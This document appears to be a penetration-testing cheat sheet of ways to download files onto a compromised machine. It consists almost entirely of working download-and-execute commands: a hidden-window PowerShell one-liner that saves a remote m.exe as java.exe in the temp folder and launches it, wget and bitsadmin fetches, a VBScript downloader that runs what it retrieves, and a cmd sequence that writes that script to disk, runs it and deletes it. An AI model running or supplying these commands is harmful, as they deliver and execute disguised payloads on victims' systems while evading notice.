# Download Files

---

Powershell script to download and save as hidden

    powershell -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadFile('http://IP/m.exe','c:\windows\temp\java.exe');Start-Process c:\windows\temp\java.exe"

using Wget

    wget -P /tmp http://ip/cmd.txt

Using Bits admin

    bitsadmin /transfer n http://ip/img/wget.exe C:\WINDOWS\Temp\wget.exe

using VB Script

    VBS
    Set Post = CreateObject("Msxml2.XMLHTTP")
    Set Shell = CreateObject("Wscript.Shell")
    Post.Open "GET","http://IP/m.exe",0
    Post.Send()
    Set aGet = CreateObject("ADODB.Stream")
    aGet.Mode = 3
    aGet.Type = 1
    aGet.Open()
    aGet.Write(Post.responseBody)
    afile = "java.exe"
    aGet.SaveToFile afile,2
    Shell.Run (afile)

using CMD * 

    del K8.vbs&
    echo Set Post = CreateObject("Msxml2.XMLHTTP") >> K8.vbs
    &&
    echo Set Shell = CreateObject("Wscript.Shell") >> K8.vbs
    &&
    echo Post.Open "GET","http://192.168.25.128:13272/m.exe",0 >> K8.vbs
    &&
    echo Post.Send() >> K8.vbs
    &&
    echo Set aGet = CreateObject("ADODB.Stream") >> K8.vbs
    &&
    echo aGet.Mode = 3 >> K8.vbs
    &&
    echo aGet.Type = 1 >> K8.vbs
    &&
    echo aGet.Open() >> K8.vbs
    &&
    echo aGet.Write(Post.responseBody) >> K8.vbs
    &&
    echo afile = "java.exe" >> K8.vbs
    &&
    echo aGet.SaveToFile afile,2 >> K8.vbs
    &&
    echo Shell.Run (afile) >>K8.vbs
    &&
    cscript K8.vbs
    &&
    del K8.vbs